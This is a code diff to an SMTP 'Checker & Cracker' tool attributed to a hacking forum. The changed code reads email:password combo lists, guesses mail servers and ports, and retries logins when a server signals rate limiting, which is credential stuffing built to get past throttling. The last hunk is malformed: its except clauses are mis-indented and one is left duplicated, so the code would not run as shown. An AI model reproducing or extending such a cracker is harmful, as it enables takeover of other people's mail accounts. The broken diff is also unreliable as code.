@@ -49,7 +49,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v25.12.15{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v24.12.15{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/IamLavander
@@ -250,7 +250,7 @@ def guess_smtp_server(domain):
             ip = get_rand_ip_of_host(host)
         except:
             continue
-        for port in [2525, 587, 465, 25]:
+        for port in [587, 465, 2525, 25]:
             debug(f'trying {host}, {ip}:{port}')
             if is_listening(ip, port):
                     return ([host+':'+str(port)], default_login_template)
@@ -279,18 +279,15 @@ def is_valid_email(email):
 def find_email_password_collumnes(list_filename):
 	email_collumn = False
 	with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
-		for i, line in enumerate(fp):
-			if i > 1000:  # Ограничиваем проверку первыми 1000 строками
-				break
+		for line in fp:
 			line = normalize_delimiters(line.lower())
-			email_match = EMAIL_REGEX.search(line)  # Используем скомпилированный regex
-			if email_match:
-				email = email_match.group(0)
-				email_collumn = line.split(email)[0].count(':')
-				password_collumn = email_collumn + 1
-				# Возвращаем сразу при первом найденном email (как в оригинале)
-				return (email_collumn, password_collumn)
-				
+			email = re.search(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}', line)
+			if email:
+				email_collumn = line.split(email[0])[0].count(':')
+				password_collumn = email_collumn+1
+				if re.search(r'@[\w.-]+\.[a-z]{2,}:.+123', line):
+					password_collumn = line.count(':') - re.split(r'@[\w.-]+\.[a-z]{2,}:.+123', line)[-1].count(':')
+					break
 	if email_collumn is not False:
 		return (email_collumn, password_collumn)
 	raise Exception('the file you provided does not contain emails')
@@ -412,12 +409,17 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
                 return True
             s.close()
             raise Exception(answer)
-        except (socket.timeout, ConnectionResetError) as e:
-            # Только таймауты и сбросы - делаем 1 повтор
-            if attempt == 0:
-                time.sleep(1.5)
-                continue
-            return False
+except (socket.timeout, ConnectionResetError) as e:
+    if attempt == 0:
+        time.sleep(1.5)
+        continue
+    return False
+except Exception as e:
+    # ПРАВКА: Повторяем и при rate limit ошибках
+    if any(x in str(e).lower() for x in ['try later', 'threshold', 'limit', 'too many']) and attempt == 0:
+        time.sleep(2)
+        continue
+    return False
         except Exception as e:
             # Любые другие ошибки (auth failed, etc) - сразу возвращаем False
             return False
